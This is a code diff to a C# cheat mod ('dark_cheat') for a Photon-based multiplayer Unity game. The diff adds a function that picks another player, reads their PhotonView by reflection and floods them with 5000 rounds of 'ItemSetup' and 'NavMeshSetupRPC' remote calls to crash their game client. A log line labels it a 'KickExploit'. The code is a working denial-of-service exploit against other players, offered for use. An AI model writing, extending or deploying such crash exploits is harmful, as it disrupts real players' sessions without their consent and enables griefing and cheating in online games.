@@ -1,5 +1,7 @@
-﻿using Photon.Pun;
+using Photon.Pun;
+using System;
 using System.Collections.Generic;
+using System.Reflection;
 using System.Text.RegularExpressions;
 using UnityEngine;
 
@@ -68,7 +70,7 @@ namespace dark_cheat
             }
             string selectedPlayerName = StripRichTextTags(Hax2.playerNames[Hax2.selectedPlayerIndex]);
             Debug.Log($"Searching for PlayerVoiceChat belonging to: '{selectedPlayerName}'");
-            foreach (var playerVoiceChat in Object.FindObjectsOfType<PlayerVoiceChat>())
+            foreach (var playerVoiceChat in global::UnityEngine.Object.FindObjectsOfType<PlayerVoiceChat>())
             {
                 string voiceChatOwnerName = StripRichTextTags(playerVoiceChat.GetComponent<PhotonView>().Owner.NickName);
                 if (voiceChatOwnerName == selectedPlayerName)
@@ -87,6 +89,58 @@ namespace dark_cheat
                 }
             }
             Debug.LogError($"No matching PlayerVoiceChat found for '{selectedPlayerName}'!");
+        }
+        public static void CrashSelectedPlayerNew()
+        {
+            try
+            {
+                if (Hax2.selectedPlayerIndex < 0 || Hax2.selectedPlayerIndex >= Hax2.playerList.Count)
+                {
+                    Debug.Log("Invalid player index!");
+                    return;
+                }
+                var selectedPlayer = Hax2.playerList[Hax2.selectedPlayerIndex];
+                if (selectedPlayer == null)
+                {
+                    Debug.Log("Selected player is null!");
+                    return;
+                }
+                Debug.Log($"Attempting to crash {Hax2.playerNames[Hax2.selectedPlayerIndex]}...");
+                var photonViewField = selectedPlayer.GetType().GetField("photonView", BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
+                if (photonViewField == null)
+                {
+                    Debug.Log("PhotonView field not found!");
+                    return;
+                }
+                var photonView = photonViewField.GetValue(selectedPlayer) as PhotonView;
+                if (photonView == null)
+                {
+                    Debug.Log("PhotonView is null!");
+                    return;
+                }
+                var targetPlayer = photonView.Owner;
+                if (targetPlayer == null)
+                {
+                    Debug.Log("Could not retrieve Photon player from PhotonView!");
+                    return;
+                }
+                LevelGenerator levelGenerator = global::UnityEngine.Object.FindObjectOfType<LevelGenerator>();
+                if (levelGenerator == null)
+                {
+                    Debug.LogError("[KickExploit] Could not find LevelGenerator PhotonView.");
+                    return;
+                }
+                for (int i = 0; i < 5000; i++)
+                {
+                    global::UnityEngine.Random.Range(0, 9999);
+                    levelGenerator.PhotonView.RPC("ItemSetup", targetPlayer, Array.Empty<object>());
+                    levelGenerator.PhotonView.RPC("NavMeshSetupRPC", targetPlayer, Array.Empty<object>());
+                }
+            }
+            catch (Exception e)
+            {
+                Debug.Log($"Error crashing {Hax2.playerNames[Hax2.selectedPlayerIndex]}: {e.Message}");
+            }
         }
     }
 }
